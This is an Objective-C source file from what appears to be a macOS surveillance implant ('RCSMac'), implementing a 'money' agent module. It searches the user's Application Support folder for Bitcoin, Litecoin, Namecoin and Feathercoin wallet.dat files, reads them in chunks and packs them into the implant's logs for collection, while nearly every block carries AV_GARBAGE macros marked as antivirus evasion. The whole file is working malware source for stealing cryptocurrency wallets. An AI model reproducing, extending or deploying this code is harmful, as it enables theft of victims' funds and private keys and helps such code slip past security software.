//
//  RCSMAgentMoney.m
//  RCSMac
//
//  Created by Monkey Mac on 10/8/14.
//
//

#import "RCSMAgentMoney.h"
#import "RCSMCommon.h"
#import "RCSMLogger.h"
#import "RCSMAVGarbage.h"

#define MAX_UPLOAD_CHUNK_SIZE  (25 *  1024 * 1024)

static __m_MAgentMoney *sharedAgentMoney = nil;

@interface __m_MAgentMoney (private)

- (void) _getMoney;
- (void) _getWallet: (NSString *)aFilePath forCoinType: (uint32_t)coinType;
//- (void) _getMarkup;
//- (void) _setMarkup;

@end

@implementation __m_MAgentMoney (private)

- (void) _getWallet: (NSString *)aFilePath forCoinType: (uint32_t)coinType
{
    moneyAdditionalHeader *additionalHeader;

    // AV evasion: only on release build
    AV_GARBAGE_000
    
    u_int numOfTotalChunks  = 1;
    u_int currentChunk      = 1;
    u_int currentChunkSize  = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_007
    
    NSDictionary *fileAttributes;
    fileAttributes = [[NSFileManager defaultManager]
                      attributesOfItemAtPath: aFilePath
                      error: nil];

    // AV evasion: only on release build
    AV_GARBAGE_001
    
    u_int fileSize = [[fileAttributes objectForKey: NSFileSize] unsignedIntValue];
    numOfTotalChunks = fileSize / MAX_UPLOAD_CHUNK_SIZE + 1;
    NSFileHandle *fileHandle = [NSFileHandle fileHandleForReadingAtPath: aFilePath];
    
    // AV evasion: only on release build
    AV_GARBAGE_004
    
#ifdef DEBUG_MONEY
    infoLog(@"numOfTotalChunks: %d", numOfTotalChunks);
#endif
    
    //
    // Do while filesize is > 0
    // in order to split the file in MAX_UPLOAD_CHUNK_SIZE
    //
    do
    {
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
        
        u_int fileNameLength = 0;
        NSString *fileName;
        
        // AV evasion: only on release build
        AV_GARBAGE_005
        
        if (numOfTotalChunks > 1)
        {
            // AV evasion: only on release build
            AV_GARBAGE_003
            
            fileName = [[NSString alloc] initWithFormat: @"%@ [%d of %d]",
                        aFilePath,
                        currentChunk,
                        numOfTotalChunks];
        }
        else
        {
            // AV evasion: only on release build
            AV_GARBAGE_002
            
            fileName = [[NSString alloc] initWithString: aFilePath];
        }
        
#ifdef DEBUG_MONEY
        infoLog(@"%@ with size (%d)", fileName, fileSize);
#endif
        
        currentChunkSize = fileSize;
        if (currentChunkSize > MAX_UPLOAD_CHUNK_SIZE)
        {
            // AV evasion: only on release build
            AV_GARBAGE_006
            
            currentChunkSize = MAX_UPLOAD_CHUNK_SIZE;
        }
        
#ifdef DEBUG_MONEY
        infoLog(@"currentChunkSize: %d", currentChunkSize);
#endif
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        fileSize -= currentChunkSize;
        currentChunk++;
        fileNameLength = [fileName lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        //
        // Fill in the agent additional header
        //
        NSMutableData *rawAdditionalHeader = [NSMutableData dataWithLength:
                                              sizeof(moneyAdditionalHeader) + fileNameLength];
        additionalHeader = (moneyAdditionalHeader *)[rawAdditionalHeader bytes];
        additionalHeader->filenameLen  = [fileName lengthOfBytesUsingEncoding:
                                             NSUTF16LittleEndianStringEncoding];
        additionalHeader->version = MONEY_VERSION;
        additionalHeader->programType = MONEY_PROGRAM_TYPE;
        additionalHeader->moneyType = coinType;

        // AV evasion: only on release build
        AV_GARBAGE_002
        
        @try
        {
            // AV evasion: only on release build
            AV_GARBAGE_008
            
            [rawAdditionalHeader replaceBytesInRange: NSMakeRange(sizeof(moneyAdditionalHeader), fileNameLength)
                                           withBytes: [[fileName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
        }
        @catch (NSException *e)
        {
#ifdef DEBUG_MONEY
            infoLog(@"Exception on replaceBytesInRange makerange");
#endif
            [fileName release];
            [innerPool release];
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
        BOOL success = [logManager createLog: AGENT_MONEY
                                 agentHeader: rawAdditionalHeader
                                   withLogID: 0];
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        if (success == FALSE)
        {
#ifdef DEBUG_MONEY
            infoLog(@"createLog failed");
#endif
            
            [fileName release];
            [innerPool release];
            return;
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_003
        
        NSData *_fileData = nil;
        
        if ((_fileData = [fileHandle readDataOfLength: currentChunkSize]) == nil)
        {
#ifdef DEBUG_MONEY
            infoLog(@"Error while reading file");
#endif
            
            [fileName release];
            [innerPool release];
            return;
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_002
        
        NSMutableData *fileData = [[NSMutableData alloc] initWithData: _fileData];
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        if ([logManager writeDataToLog: fileData
                              forAgent: AGENT_MONEY
                             withLogID: 0] == FALSE)
        {
#ifdef DEBUG_MONEY
            infoLog(@"Error while writing data to log");
#endif
            
            // AV evasion: only on release build
            AV_GARBAGE_007
            
            [fileData release];
            [fileName release];
            [innerPool release];
            return;
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        if ([logManager closeActiveLog: AGENT_MONEY
                             withLogID: 0] == FALSE)
        {
#ifdef DEBUG_MONEY
            infoLog(@"Error while closing activeLog");
#endif
            [fileData release];
            [fileName release];
            [innerPool release];
            return;
        }
        
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        [fileData release];
        [fileName release];
        [innerPool drain];
    }
    while (fileSize > 0);
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [fileHandle closeFile];
    
    // AV evasion: only on release build
    AV_GARBAGE_000

#ifdef DEBUG_MONEY
    infoLog(@"the end");
#endif

    return;
  
}

- (void) _getMoney
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    // wallets usually are in: /Users/<user>/Library/Application Support/<currency>/<wallet.dat>
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES);
    NSString *applicationSupportDirectory = [paths firstObject];
    
    NSString *bitcoinWallet = [NSString stringWithFormat:@"%@/%@", applicationSupportDirectory, @"Bitcoin/wallet.dat"];
    NSString *litecoinWallet = [NSString stringWithFormat:@"%@/%@", applicationSupportDirectory, @"Litecoin/wallet.dat"];
    NSString *namecoinWallet = [NSString stringWithFormat:@"%@/%@", applicationSupportDirectory, @"Namecoin/wallet.dat"];
    NSString *feathercoinWallet = [NSString stringWithFormat:@"%@/%@", applicationSupportDirectory, @"Feathercoin/wallet.dat"];
    
    if ([[NSFileManager defaultManager] fileExistsAtPath:bitcoinWallet]) {
#ifdef DEBUG_MONEY
        infoLog(@"bitcoin found!");
#endif
        [self _getWallet: bitcoinWallet forCoinType:BITCOIN_TYPE];
    }
    if ([[NSFileManager defaultManager] fileExistsAtPath:litecoinWallet]) {
#ifdef DEBUG_MONEY
        infoLog(@"litecoin found!");
#endif
        [self _getWallet: litecoinWallet forCoinType:LITECOIN_TYPE];
    }
    if ([[NSFileManager defaultManager] fileExistsAtPath:namecoinWallet]) {
#ifdef DEBUG_MONEY
        infoLog(@"namecoin found!");
#endif
        [self _getWallet: namecoinWallet forCoinType:NAMECOIN_TYPE];
    }
    if ([[NSFileManager defaultManager] fileExistsAtPath:feathercoinWallet]) {
#ifdef DEBUG_MONEY
        infoLog(@"feathercoin found!");
#endif
        [self _getWallet: feathercoinWallet forCoinType:FEATHERCOIN_TYPE];
    }
    
    [pool release];
}

/*
- (void) _getMarkup
{
    markup = [[__m_MUtils sharedInstance] getPropertyWithName:[[self class] description]];
    if(markup==nil)
    {
        // markup not found, we allocate it
        markup = [NSMutableDictionary dictionaryWithCapacity: 1];
    }
}

- (void) _setMarkup
{
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
    [[__m_MUtils sharedInstance] setPropertyWithName:[[self class] description]withDictionary:markup];
    
    [pool release];
}
*/

@end


@implementation __m_MAgentMoney

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentMoney *)sharedInstance
{
    @synchronized(self)
    {
        if (sharedAgentMoney == nil)
        {
            //
            // Assignment is not done here
            //
            [[self alloc] init];
        }
    }
    
    return sharedAgentMoney;
}

+ (id)allocWithZone: (NSZone *)aZone
{
    @synchronized(self)
    {
        if (sharedAgentMoney == nil)
        {
            sharedAgentMoney = [super allocWithZone: aZone];
            
            //
            // Assignment and return on first allocation
            //
            return sharedAgentMoney;
        }
    }
    
    // On subsequent allocation attemps return nil
    return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
    return self;
}

- (unsigned)retainCount
{
    // Denotes an object that cannot be released
    return UINT_MAX;
}

- (id)retain
{
    return self;
}

- (void)release
{
    // Do nothing
}

- (id)autorelease
{
    return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -


- (BOOL)stop
{
    int internalCounter = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_STOP
                       forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    while (![[mConfiguration objectForKey: @"status"]  isEqual: AGENT_STOPPED]
           && internalCounter <= MAX_STOP_WAIT_TIME)
    {
        // AV evasion: only on release build
        AV_GARBAGE_004
        
        internalCounter++;
        usleep(100000);
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    return YES;
}

- (void)start
{
    NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
    
#ifdef DEBUG_MONEY
    infoLog(@"module money started");
#endif
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
    
    //[self _getMarkup];
    
    [self _getMoney];
    
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    [mConfiguration setObject: AGENT_STOPPED forKey: @"status"];
    
    // AV evasion: only on release build
    AV_GARBAGE_005
    
    [outerPool release];
}


- (BOOL)resume
{
    return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    return mConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
    // AV evasion: only on release build
    AV_GARBAGE_009
    
    if (aConfiguration != mConfiguration)
    {
        // AV evasion: only on release build
        AV_GARBAGE_000
        
        [mConfiguration release];
        
        // AV evasion: only on release build
        AV_GARBAGE_001
        
        mConfiguration = [aConfiguration retain];
    }
}

@end
